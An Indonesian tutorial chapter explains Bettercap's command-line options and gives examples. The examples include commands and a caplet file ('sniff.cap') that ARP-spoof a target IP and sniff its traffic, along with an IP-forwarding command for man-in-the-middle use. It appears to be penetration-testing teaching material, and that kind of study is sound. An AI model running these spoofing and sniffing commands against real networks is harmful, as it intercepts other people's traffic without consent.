# Bab 5 - Struktur Lengkap Perintah CLI Bettercap

## A. Menu Help Bettercap

Tampilkan menu bantuan (`help`) dari [Bettercap](https://www.bettercap.org/) menggunakan perinah:

```
sudo betercap --help
```

Berikut ini adalah **daftar** dan **penjelasan parameter** yang tersedia saat menampilkan menu bantuan (`help`) dari `Bettercap`:

| Opsi CLI | Fungsi |
|:--:|:--:|
| `-iface <nama_interface>`	| Menentukan **interface jaringan** yang digunakan (contoh: **eth0**, **wlan0**, **dll**) |
| `-caplet <file.cap>` | Menjalankan **caplet script** (file berisi perintah `bettercap`) saat startup |
| `-eval "perintah;perintah"` | Menjalankan perintah langsung di **CLI** tanpa harus masuk **shell interaktif** |
| `-autostart <modul1,modul2>` | Menjalankan modul tertentu secara otomatis saat startup |
| `-env-file <file>` | Load file **environment** tertentu saat sesi dimulai |
| `-script <file>` | Menjalankan script sesi (biasanya `.lua` atau `.cap` custom) |
| `-caplets-path <folder>` | Menentukan lokasi **direktori** untuk semua **caplet** |
| `-gateway-override <IP>` | Override default **gateway** dengan **IP lain** jika perlu |
| `-cpu-profile <file>` | Simpan profiling penggunaan **CPU** ke **file** (debug/performance testing) |
| `-mem-profile <file>` | Simpan profiling penggunaan **memori** ke **file** |
| `-no-colors` | Menonaktifkan **warna output** (berguna jika dikirim ke **file/log**) |
| `-no-history` | Nonaktifkan penyimpanan **history** sesi interaktif |
| `-pcap-buf-size <int>` | Atur ukuran buffer **PCAP** ([sniffing](https://cyberhub.id/pengetahuan-dasar/apa-itu-sniffing)), biarkan **0** untuk default |
| `-debug` | Tampilkan semua **log debug** (sangat **verbose**, untuk **developer** / **troubleshooting**) |
| `-silent` | Nonaktifkan semua **log** kecuali **error** |
| `-version` | Tampilkan versi `Bettercap` dan **keluar** |

## B. Contoh Penggunaan Umum:

```
sudo bettercap -iface <nama_interface>
```

Setelah itu akan masuk ke `shell interaktif`:

```
bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]

192.168.1.0/24 > 192.168.1.11  » [17:08:48] [sys.log] [inf] gateway monitor started ...
192.168.1.0/24 > 192.168.1.11  »  
```

## C. Contoh Praktis

### 1. Caplet File:

```
sudo bettercap -iface <nama_interface> -caplet <nama_file_caplet>
```

### 2. Eval Langsung:

```
sudo bettercap -iface <nama_interface> -eval "set arp.spoof.targets 192.168.1.5; arp.spoof on; net.sniff on"
```

### 3. Override Gateway dan Autostart Modul:

```
sudo bettercap -iface <nama_interface> -gateway-override 192.168.1.1 -autostart "arp.spoof,net.sniff"
```

## D. Caplet Contoh (file: sniff.cap)

```
set arp.spoof.targets <ip_address_target>
set net.sniff.verbose true
arp.spoof on
net.sniff on
```

## E. Catatan Penting:
- Gunakan `-iface` dengan benar sesuai interface aktif (`ifconfig` atau `ip a` untuk **cek**).
- **Caplet** digunakan untuk menyusun **script otomatisasi serangan**.
- Lebih praktis menggunakan `-eval` untuk uji cepat langsung dari **CLI**.
- Jangan lupa aktifkan **IP forwarding** jika kamu jalankan **MITM**:

  ```
  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
  ```
